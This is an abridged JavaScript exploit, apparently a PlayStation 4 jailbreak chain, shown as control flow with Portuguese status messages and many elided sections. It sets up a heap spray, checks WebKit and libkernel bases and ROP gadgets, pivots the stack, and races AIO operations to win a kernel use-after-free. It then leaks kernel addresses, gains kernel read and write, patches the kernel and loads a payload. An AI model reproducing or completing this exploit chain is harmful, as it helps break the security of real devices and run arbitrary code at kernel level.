...
(async function () {
    ...
    try {
        ...
        const ITERS = clamp(params.get("iters"), 1, 2000, 400);
        const SPRAY_NUM = clamp(params.get("spray"), 0x40, 0x400, 0x200);

        const STOP_PRECOMMIT = params.get("stop") === "precommit";

        const PATCH_SETTLE = clamp(params.get("patchsettle"), 0, 10000, 2000);
        const PAYLOAD_SETTLE = clamp(params.get("payloadsettle"), 0, 10000, 2000);
        ...
        mark("FW", key || "(UA nao e de PS4)");
        if (!off) {
            state("firmware sem suporte -- recusado (" + (key || "UA invalida") + ")", "bad");
            mark("FW-REFUSED", "recusa " + (key || "null") + " para nao aplicar offset errado no kernel");
        ...
        if (!plausibleBase(webkitBase) || !plausibleBase(libkernelBase)) {
            state("base invalida", "bad"); return;
        }
        ...
        if (fatal) { state("gadgets nao conferem", "bad"); return; }
        ...
        if (!argGadget[4]) { state("sem pop r8", "bad"); return; }
        ...
        state("mapeando syscalls do libkernel...", "warn");
        ...
        if (missing.length) { state("syscalls ausentes", "bad"); return; }
        ...
        if (!mainCtx || !wrkCtx) { state("backing stores falharam", "bad"); return; }
        ...
        if (!sameI64(origNative, nativeFn)) {
            state("m_function mudou", "bad"); return;
        }
        const mainPivotObj = {};
        ...
        check("main-thread-pivot-lands", sameI64(wit, mainCtx.P),
            wit + " want " + mainCtx.P);
        if (!sameI64(wit, mainCtx.P)) { state("pivot falhou", "bad"); return; }
        ...
        state("ligando worker...", "warn");
        worker = new Worker("rpc_worker.mjs");
        rpc = makeRpc(worker);
        await rpc("ping");
        ...
        if ((p.read4(D) >>> 0) !== SENT_LO) {
            ...
            state("transferencia corrompeu o store", "bad"); return;
        }
        ...
        if (!(wMaster && wVictim && wLeak)) { state("walk falhou", "bad"); return; }
        wMasterAddr = wMaster;
        ...
        state("preparando lotes aio...", "warn");
        ...
        state("dry run: tudo menos o delete...", "warn");
        ...
        check("loopback-server-socket-bound-listening",
            ...
            + " fd=" + server);
        if (br !== 0 || lr2 !== 0) { state("servidor nao subiu", "bad"); }
        ...
        const PROBE_CAP = clamp(params.get("probes"), 0, 64, 0);

        const PRE_SUSPEND_MS = clamp(params.get("presleep"), 0, 1000, 15);

        const STRICT_TCP = params.get("strict") === "1";
        const YIELD_CAP = clamp(params.get("yields"), 0, 1024, 64);

        const ATTEMPTS = clamp(params.get("attempts"), 1, 100, 20);

        const MAX_MISFIRES = clamp(params.get("misfires"), 1, 32, 3);
        ...
        if (!(mp === 0 && wp === 0 && ma === 0 && wa === 0)) {
            ...
            state("pin falhou -- sem armar", "bad");
        ...
        if (ipv6Socks.length !== IPV6_SOCK_NUM) {
            state("reclaim nao subiu -- sem armar", "bad");
        ...
        if (twins) {
            ...
            state("vazando enderecos do kernel...", "warn");
            const leakOk = (function () {
                ...
                state("etapa 3: forjando entrada aio...", "warn");
                ...
                state("etapa 4: leitura do kernel...", "warn");
                ...
                state("etapa 5: escrita no kernel...", "warn");
                ...
                state("etapa 6: localizando base do kernel...", "warn");
                const KSTR_RESIDUE = evfCv.low & 0x3fff;
                const KSTR_LO_RAW = params.has("kstrlo")
                    ? parseInt(params.get("kstrlo"), 16) : 0x780000;
                const KSTR_LO = Number.isFinite(KSTR_LO_RAW) ? KSTR_LO_RAW : 0x780000;
                const KSTR_HI_RAW = params.has("kstrhi")
                    ? parseInt(params.get("kstrhi"), 16) : 0x800000;
                const KSTR_HI = Number.isFinite(KSTR_HI_RAW) && KSTR_HI_RAW >= KSTR_LO
                    ? KSTR_HI_RAW : 0x800000;
                ...
                if (pipeM && pipeS) {
                    ...
                    if (preflightOk) try {
                            ...
                            if (shaped) {
                                ...
                                state("construindo KernelView...", "warn");
                                ...
                                state("etapa 7: reparando aliases...", "warn");
                                ...
                                if (!(jailbroken && kbase && kpatch)) {
                                    ...
                                    state("etapa 9: patches do kernel...", "warn");
                                ...
                                if (!kpatched && !(kpatchCtap && jailbroken)) {
                                ...
                                else if (payload && (kpatched || kpatchCtap && jailbroken || params.get("payload") === "1"))
                                    try {
                                    state("etapa 10: carregando payload...", "warn");
        ...
        if (twins) {
            ...
            state("LIBERADO SEM RECLAIM -- REINICIE AGORA", "bad");
        } else if (failCount === 0) {
            state("sem vitoria em " + attemptsUsed + " tentativas", "warn");
        } else {
            state("veja o log", "bad");
        }
